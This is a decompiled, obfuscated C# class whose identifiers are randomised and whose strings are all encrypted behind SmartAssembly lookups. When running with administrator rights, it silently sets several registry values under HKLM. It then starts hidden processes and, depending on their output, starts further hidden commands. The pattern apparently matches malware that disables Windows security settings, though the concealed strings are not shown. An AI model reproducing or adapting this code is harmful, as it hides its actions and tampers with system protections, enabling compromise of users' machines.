using System;
using System.Diagnostics;
using System.Security.Principal;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace gZJMShdGuoGG;

public static class IsqArpFpqTGJ
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void bGjENrlzBgm()
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			SOJhbcmJzgi(getString_0(107410634), getString_0(107410573), getString_0(107393586));
			SOJhbcmJzgi(getString_0(107411060), getString_0(107410999), getString_0(107411463));
			SOJhbcmJzgi(getString_0(107410942), getString_0(107410853), getString_0(107411463));
			SOJhbcmJzgi(getString_0(107410942), getString_0(107410816), getString_0(107411463));
			SOJhbcmJzgi(getString_0(107410942), getString_0(107410267), getString_0(107411463));
			aYstgrfhFfDxJdGzG();
		}
	}

	private static void SOJhbcmJzgi(string string_0, string string_1, string string_2)
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string_0, RegistryKeyPermissionCheck.ReadWriteSubTree);
			if (registryKey == null)
			{
				Registry.LocalMachine.CreateSubKey(string_0).SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
			else if (registryKey.GetValue(string_1) != string_2)
			{
				registryKey.SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
		}
		catch
		{
		}
	}

	private static void aYstgrfhFfDxJdGzG()
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107393743),
			Arguments = getString_0(107410262),
			UseShellExecute = false,
			RedirectStandardOutput = true,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
		while (!process2.StandardOutput.EndOfStream)
		{
			string text = process2.StandardOutput.ReadLine();
			if (text.StartsWith(getString_0(107410225)) && text.EndsWith(getString_0(107410188)))
			{
				lFXrPqMfMBFd(getString_0(107410147));
			}
			else if (text.StartsWith(getString_0(107410853)) && text.EndsWith(getString_0(107410188)))
			{
				lFXrPqMfMBFd(getString_0(107410078));
			}
			else if (text.StartsWith(getString_0(107410521)) && text.EndsWith(getString_0(107410188)))
			{
				lFXrPqMfMBFd(getString_0(107410520));
			}
			else if (text.StartsWith(getString_0(107410455)) && text.EndsWith(getString_0(107410188)))
			{
				lFXrPqMfMBFd(getString_0(107410394));
			}
			else if (text.StartsWith(getString_0(107410333)) && text.EndsWith(getString_0(107410188)))
			{
				lFXrPqMfMBFd(getString_0(107410308));
			}
			else if (text.StartsWith(getString_0(107409771)) && text.EndsWith(getString_0(107410188)))
			{
				lFXrPqMfMBFd(getString_0(107409710));
			}
			else if (text.StartsWith(getString_0(107409617)) && text.EndsWith(getString_0(107410188)))
			{
				lFXrPqMfMBFd(getString_0(107409584));
			}
			else if (text.StartsWith(getString_0(107410031)) && text.EndsWith(getString_0(107410188)))
			{
				lFXrPqMfMBFd(getString_0(107409954));
			}
			else if (text.StartsWith(getString_0(107409909)) && text.EndsWith(getString_0(107410188)))
			{
				lFXrPqMfMBFd(getString_0(107409880));
			}
			else if (text.StartsWith(getString_0(107409787)) && !text.EndsWith(getString_0(107409246)))
			{
				lFXrPqMfMBFd(getString_0(107409241));
			}
			else if (text.StartsWith(getString_0(107409184)) && !text.EndsWith(getString_0(107393586)))
			{
				lFXrPqMfMBFd(getString_0(107409195));
			}
			else if (text.StartsWith(getString_0(107409118)) && !text.EndsWith(getString_0(107409085)))
			{
				lFXrPqMfMBFd(getString_0(107409112));
			}
			else if (text.StartsWith(getString_0(107409043)) && !text.EndsWith(getString_0(107409085)))
			{
				lFXrPqMfMBFd(getString_0(107409518));
			}
			else if (text.StartsWith(getString_0(107409453)) && !text.EndsWith(getString_0(107409085)))
			{
				lFXrPqMfMBFd(getString_0(107409420));
			}
			else if (text.StartsWith(getString_0(107409363)) && !text.EndsWith(getString_0(107409085)))
			{
				lFXrPqMfMBFd(getString_0(107409326));
			}
		}
	}

	public static void lFXrPqMfMBFd(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107393743),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	static IsqArpFpqTGJ()
	{
		Strings.CreateGetStringDelegate(typeof(IsqArpFpqTGJ));
	}
}
